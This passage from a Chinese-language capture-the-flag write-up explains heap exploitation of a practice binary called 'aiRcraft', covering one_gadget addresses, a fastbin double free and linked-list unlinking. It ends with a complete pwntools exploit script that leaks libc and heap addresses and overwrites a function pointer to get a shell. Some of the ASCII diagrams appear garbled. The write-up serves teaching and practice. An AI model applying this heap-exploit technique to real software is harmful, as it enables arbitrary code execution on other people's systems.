    constraints:
      rax == NULL
    0x4526a	execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf02a4	execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147	execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
这里的任何一个地址，只要满足了下面的限制条件，跳转过去可以直接getshell。
### 2\. Double Free & Get Shell
现在我们已经知道了应该将执行流劫持到什么地址了，于是我们的目标变为了劫持执行流。
在之前提到了，由于sell_plane()函数并没有将airport->planes数组中的对应位置清空，因此我们理论上可以无限次进行free操作，这里我们只需要两次就足够了。
对于Fast Bin的Double Free的方法已经有非常详尽的教程，这里只简要叙述：
    int main(){
    	void *a = malloc(0x10);
    	void *b = malloc(0x10);
    	free(a);
    	free(b);
    	free(a);
    	a = malloc(0x10);
    	b = malloc(0x10);
    	void *c = malloc(0x10);
    }
在上面的一段代码中，最终的结果是a==c，具体原因不再赘述，成功的关键在于两次free(a)的操作之间必须要free一个大小处于同一个Fast
Bin的chunk。
在我们的题目中若要两次free一个plane，必须第一次调用sell_plane()函数，第二次调用sell_airport()函数（此时要求该plane处于airport->planes数组中），而不能反过来，因为sell_airport()函数调用之后就会将plane从plane_header所维护的链表中解除链接，再去调用sell_plane()函数就无法再定位到这个plane了（sell_plane()函数之前是先遍历链表来找到plane地址）。
但是即使知道了这一点，我们同样无法使用plane1进行Double Free操作，接下来我将描述一下这个细节：
假设我们再申请一个plane2用于中间的一次free操作，那么在Free之前链表处于这样的状态：
    plane_header       plane1          plane2  
     +-------+        +-------+       +-------+
     |  ufd  |------->|  ufd  |------>|  ufd  |
     +-------+        +-------+       +-------+
     |  ubk  ||  ufd  |
     +-------+          +-------+
     |  ubk  | null        |  ufd  |----->  null 
     +-------+                   +-------+             
     |  ubk  |ubk->ufd = plane->ufd;
      	result = plane->ufd;
      	if ( result )
      	{
        	result = plane->ufd;
        	result->ubk = plane->ubk;
      	}
      	return result;
    	}
因此最终的情形是这样：
    plane_header                  plane2               
     +-------+                   +-------+             
     |  ufd  |------------------>|  ufd  |----->  null 
     +-------+                   +-------+             
     |  ubk  |plane1—>plane2—>plane1
为了方便读者对照，这里同样将add_plane_to_linklist函数的代码在这里列出：
    plane* add_plane_to_linklist(struct plane *plane){
    	struct plane *result;
    	struct plane *i;
    	for( i = &plane_header; i->ufd; i = i->ufd);
    	i->ufd = plane;
    	plane->ufd = 0;
    	result = plane;
    	plane->ubk = i;
    	return result;
    }
现在我们进行第一次申请，我们会得到plane1所在的chunk，Fast bin如下：
Fast bin—>plane2—>plane1
链表会变成如下结构：
    plane_header        plane2           plane1  
     +-------+         +-------+        +-------+
     |  ufd  |-------->|  ufd  |------->|  ufd  |
     +-------+         +-------+        +-------+
     |  ubk  |plane1
链表会变成如下结构：
                            +------------------------+
                            v                        |
    plane_header        plane2           plane1      |
     +-------+         +-------+        +-------+    |
     |  ufd  |-------->|  ufd  |-->null |  ufd  |----+
     +-------+         +-------+        +-------+     
     |  ubk  |      +--|  ubk  |free_pointer（仍有一些小细节在后面会提到），之后理所应当应该调用函数触发free_pointer，但是当我们尝试调用sell_plane()函数时，函数顺着链表检索下去，到了plane2就会认为已经到了链表的结尾（因为plane2->ufd==null），无法找到plane1，因此无法顺利进行下去了。
要解决这个问题很简单，有两种思路：
1\. 只需要两次Double
Free的对象在一开始位于链表的尾部就可以了，我们可以使用plane2作为DoubleFree的对象，于是我们需要再申请一个airport对象，并将plane2通过fly_to函数加入新申请的airport的planes数组中，用于两次free操作，这个思路的操作方法并不惟一，但是必须保证Double
Free的对象处于链表的尾部；
2\.
在第三次申请之前，将plane1通过fly_to的操作加入某个airport的planes数组中（不妨称它为tmp_airport），当第三次通过build_airport函数将plane1改写之后，可以通过sell_airport(tmp_airport)的操作触发plane1的free_pointer。
最后我们需要再考虑一个细节，当我们通过build_airport函数改写plane1中的内容时，有几个位置的内容并不是可以随意更改的。我们将plane的结构画在下面：
    +--------------+
    |   prevsize   |
    +--------------+
    |     size     |
    +--------------+
    |              |
    |              |
    |              |
    |              |
    |  plane_name  |
    |    (0x20)    |
    |              |
    |              |
    |              |
    |              |
    +--------------+
    | company_name |
    +--------------+
    |   airport    |
    +--------------+
    |     ubk      |
    +--------------+
    |     ufd      |
    +--------------+
    | free_pointer |
    +--------------+
我们的目标是free_pointer，但是当我们最后一次申请时，程序将它全部当作了字符串，因此我们不可避免地要覆盖前面的所有内容，这里有这样几条限制条件：
1\. plane_name的字符串后面必须加上’\0’，这样才能截断形成字符串，用于sell_plane函数定位plane1的地址；
2\.
ubk与ufd所指向的地址必须能够通过unlink_plane函数，如果随意填写，就会造成段错误，这里我的做法是在覆写之前下断点，记录下原本ubk与ufd的值，计算它们与heap基址的偏移量offsetbk与offsetfd，虽然在实际运行的过程中地址会不同，但是堆的布局都是相同的，因此我们只需要用heapbase+offsetbk与heapbase+offsetfd去分别覆盖着两个部分就能保证通过unlink_plane函数（这里的heapbase是我们之前得到的堆基址）；
3\. 将free_pointer覆盖成one_gadget所在的地址（libcbase+offset(one_gadget)）。
最后调用sell_plane()函数将plane1释放，即可Get Shell。
one_gadget的限制条件并不是每次都能满足，有时可能需要多试几个，甚至有时都不能满足条件，但是这道题第一个就可以直接满足条件。
## My Exploit
    from pwn import *
    DEBUG=0
    if(DEBUG==1):
        context(os='linux', arch='i386', log_level='debug')
    libc=ELF('./libc.so.6')
    heapbase=0
    mainarena=0
    libcbase=0
    p=process('./aiRcraft')
    gadget1=0x45216
    gadget2=0x4526a
    gadget3=0xf02a4
    gadget4=0xf1147
    def buy_plane(company, name):
        p.recvuntil('Your choice: ')
        p.sendline('1')
        p.recvuntil('Your choice: ')
        p.sendline(str(company))
        p.recvuntil('Input the plane\'s name: ')
        p.send(name)
    def build_airport(length, name):
        p.recvuntil('Your choice: ')
        p.sendline('2')
        p.recvuntil('How long is the airport\'s name? ')
        p.sendline(str(length))
        p.recvuntil('Please input the name: ')
        p.send(name)
    def sell_airport(num):
        p.recvuntil('Your choice: ')
        p.sendline('3')
        p.recvuntil('Which airport do you want to choose? ')
        p.sendline(str(num))
        p.recvuntil('Your choice: ')
        p.sendline('2')
        p.recvuntil('Success!')
    def list_plane(num):
        p.recvuntil('Your choice: ')
        p.sendline('3')
        p.recvuntil('Which airport do you want to choose? ')
        p.sendline(str(num))
        p.recvuntil('Your choice: ')
        p.sendline('1')
        string=p.recvuntil('What do you want to do ?')[:-25]
        p.recvuntil('Your choice: ')
        p.sendline('3')
        return string
    def fly_to(name, num):
        p.recvuntil('Your choice: ')
        p.sendline('4')
        p.recvuntil('Which plane do you want to choose? ')
        p.send(name)
        p.recvuntil('Your choice: ')
        p.sendline('1')
        p.recvuntil('which airport do you want to fly? ')
        p.sendline(str(num))
        p.recvuntil('Your choice: ')
        p.sendline('3')
    def sell_plane(name):
        p.recvuntil('Your choice: ')
        p.sendline('4')
        p.recvuntil('Which plane do you want to choose? ')
        p.send(name)
        p.recvuntil('Your choice: ')
        p.sendline('2')
    def main():
        build_airport(16, 'stuff\n')
        buy_plane(13, 'tel\n')
        build_airport(16, 'listen\n')
        fly_to('tel\n', 1)
        sell_airport(0)
        mainarena=u64(list_plane(1).split('\n')[1][9:]+'\x00\x00')-88
        print hex(mainarena)
        buy_plane(1, 'stuff1\n')
        buy_plane(2, 'stuff2\n')
        sell_plane('stuff2\n')
        sell_plane('stuff1\n')
        heapbase=u64(list_plane(1).split('\n')[1][9:]+'\x00\x00')-0x1b0
        print hex(heapbase)
        libcbase=mainarena-0x3C4B20
        build_airport(16, 'op\n')
        buy_plane(1, 'stuff1\n')
        buy_plane(2, 'stuff2\n')
        buy_plane(1, 'tmp2\n')
        buy_plane(2, 'tmp1\n')
        fly_to('tmp1\n', 2)
        sell_plane('tmp1\n')
        sell_plane('tmp2\n')
        sell_airport(2)
        buy_plane(1, 'tmp1\n')
        buy_plane(2, 'tmp2\n')
        pause()
        payload=''
        payload+='kongjia'+'\0'
        payload+=p64(0)*5
        payload+=p64(0x1c0+heapbase)
        payload+=p64(0x2a0+heapbase)
        payload+=p64(libcbase+gadget1)
        build_airport(0x48, payload)
        sell_plane('kongjia\n')
        p.interactive()
    if __name__=='__main__':
        main()
这份exploit与之前所讲的思路有一些细节上的不同，但是都在之前静态分析出的框架之下，只需要简单调试就能看懂。